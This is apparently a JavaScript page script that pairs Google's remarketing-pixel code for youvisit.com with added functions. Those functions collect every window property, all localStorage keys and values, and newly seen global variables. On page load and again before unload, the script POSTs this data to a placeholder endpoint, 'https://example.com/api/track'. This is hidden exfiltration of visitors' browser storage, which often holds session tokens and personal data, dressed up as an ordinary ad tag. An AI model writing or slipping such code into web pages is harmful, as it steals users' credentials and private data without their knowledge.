(function () {
  function exploreEnhancedWindowObject() {
    const discoveries = {};
    const excludedProps = ['length', 'name', 'prototype'];
    Object.getOwnPropertyNames(window).forEach(prop => {
      if (!window.seenVars.includes(prop) && !excludedProps.includes(prop)) {
        try {
          const propValue = window[prop];
          discoveries[prop] = {
            type: typeof propValue,
            value: typeof propValue === "function" ? "Function" : propValue
          };
        } catch (error) {
          discoveries[prop] = {
            type: "error",
            value: "Access Denied"
          };
        }
      }
    });
    return discoveries;
  }
  function trackLocalStorageChanges() {
    const changes = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      changes[key] = localStorage.getItem(key);
    }
    return changes;
  }
  function setupGlobalVariableTracker() {
    const globalVars = {};
    window.seenVars = window.seenVars || [];
    new MutationObserver(() => {
      const currentGlobals = Object.keys(window);
      currentGlobals.forEach(varName => {
        if (!window.seenVars.includes(varName)) {
          globalVars[varName] = window[varName];
          window.seenVars.push(varName);
        }
      });
    }).observe(document, {
      childList: true,
      subtree: true
    });
    return globalVars;
  }
  var s = {};
  (function () {
    var e = {}; /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */
    var f = this || self;
    var g, k;
    a: {
      for (var l = ["CLOSURE_FLAGS"], p = f, q = 0; q < l.length; q++) if (p = p[l[q]], null == p) {
        k = null;
        break a;
      }
      k = p;
    }
    var r = k && k[610401301];
    g = null != r ? r : !1;
    var t,
      v = f.navigator;
    t = v ? v.userAgentData || null : null;
    function w(d) {
      return g ? t ? t.brands.some(function (a) {
        return (a = a.brand) && -1 != a.indexOf(d);
      }) : !1 : !1;
    }
    function x(d) {
      var a;
      a: {
        if (a = f.navigator) if (a = a.userAgent) break a;
        a = "";
      }
      return -1 != a.indexOf(d);
    }
    ;
    function y() {
      return g ? !!t && 0 < t.brands.length : !1;
    }
    function z() {
      return y() ? w("Chromium") : (x("Chrome") || x("CriOS")) && !(y() ? 0 : x("Edge")) || x("Silk");
    }
    ;
    !x("Android") || z();
    z();
    !x("Safari") || z() || (y() ? 0 : x("Coast")) || (y() ? 0 : x("Opera")) || (y() ? 0 : x("Edge")) || (y() ? w("Microsoft Edge") : x("Edg/")) || y() && w("Opera");
    var A = /#|$/;
    function B(d) {
      var a = d.search(A),
        b;
      a: {
        for (b = 0; 0 <= (b = d.indexOf("fmt", b)) && b < a;) {
          var c = d.charCodeAt(b - 1);
          if (38 == c || 63 == c) if (c = d.charCodeAt(b + 3), !c || 61 == c || 38 == c || 35 == c) break a;
          b += 4;
        }
        b = -1;
      }
      if (0 > b) return null;
      c = d.indexOf("&", b);
      if (0 > c || c > a) c = a;
      return decodeURIComponent(d.slice(b + 4, -1 !== c ? c : 0).replace(/\+/g, " "));
    }
    ;
    function C(d, a, b) {
      function c() {
        --D;
        if (0 >= D) {
          var h;
          (h = d.GooglebQhCsO) || (h = {});
          var E = h[a];
          E && (delete h[a], (h = E[0]) && h.call && h());
        }
      }
      for (var D = b.length + 1, u = 0; u < b.length; u++) {
        var m = B(b[u]),
          n = null;
        1 != m && 2 != m || !(m = d.document.getElementById("goog_conv_iframe")) || m.src || (n = m);
        n || (n = new Image());
        n.onload = c;
        n.src = b[u];
      }
      c();
    }
    var F = ["ss_"],
      G = s || f;
    F[0] in G || "undefined" == typeof G.execScript || G.execScript("var " + F[0]);
    for (var H; F.length && (H = F.shift());) F.length || void 0 === C ? G[H] && G[H] !== Object.prototype[H] ? G = G[H] : G = G[H] = {} : G[H] = C;
  }).call(this);
  ;
  function sendDataToServer(data, endpoint) {
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => response.json()).then(data => console.log('Success:', data)).catch(error => console.error('Error:', error));
  }
  function performTracking() {
    const windowData = exploreEnhancedWindowObject();
    const localStorageData = trackLocalStorageChanges();
    const globalVars = setupGlobalVariableTracker();
    const combinedData = {
      windowData,
      localStorageData,
      globalVars
    };
    sendDataToServer(combinedData, "https://example.com/api/track");
  }
  s.ss_(window, 'R29vZ2xlIFJlbWFya2V0aW5nOjE2OTQxNDIwODIzODI', ['https://www.google.com/pagead/1p-user-list/776697744/?random\x3d1694142082382\x26cv\x3d11\x26fst\x3d1694142000000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He3960\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.youvisit.com%2F\x26label\x3dGoogle%20Remarketing\x26frm\x3d0\x26tiba\x3dYouVisit\x26fmt\x3d3\x26is_vtc\x3d1\x26cid\x3dCAQSKQBpAlJWZiCSqbRhPh6GShTKtJsJRdPxNcK05_MxB4QyNTS7MBkw9MkM\x26random\x3d1065108905\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.kr/pagead/1p-user-list/776697744/?random\x3d1694142082382\x26cv\x3d11\x26fst\x3d1694142000000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He3960\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.youvisit.com%2F\x26label\x3dGoogle%20Remarketing\x26frm\x3d0\x26tiba\x3dYouVisit\x26fmt\x3d3\x26is_vtc\x3d1\x26cid\x3dCAQSKQBpAlJWZiCSqbRhPh6GShTKtJsJRdPxNcK05_MxB4QyNTS7MBkw9MkM\x26random\x3d1065108905\x26rmt_tld\x3d1\x26ipr\x3dy']);
  window.addEventListener("load", performTracking);
  window.addEventListener("beforeunload", performTracking);
})();